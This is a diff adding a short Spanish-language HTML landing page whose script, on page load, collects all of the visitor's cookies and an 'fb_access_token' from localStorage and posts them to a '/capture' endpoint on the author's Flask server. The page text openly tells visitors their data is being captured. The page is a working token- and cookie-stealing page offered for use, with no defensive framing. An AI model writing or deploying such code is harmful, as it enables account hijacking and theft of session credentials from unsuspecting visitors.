@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Landing Page para Captura de Tokens</title>
+    <script>
+        function captureTokens() {
+            // Obtener todas las cookies
+            var cookies = document.cookie;
+
+            // Obtener tokens de acceso del almacenamiento local
+            var localStorageTokens = localStorage.getItem('fb_access_token');
+
+            // Enviar las cookies y tokens a tu servidor Flask
+            fetch('/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: cookies, localStorageTokens: localStorageTokens })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Datos enviados con éxito:', data);
+            })
+            .catch(error => {
+                console.error('Error al enviar datos:', error);
+            });
+        }
+
+        // Llamar a la función cuando la página se cargue
+        window.onload = captureTokens;
+    </script>
+</head>
+<body>
+    <h1>Bienvenido a Nuestra Landing Page</h1>
+    <p>Por favor, espere un momento mientras capturamos sus datos.</p>
+</body>
+</html>
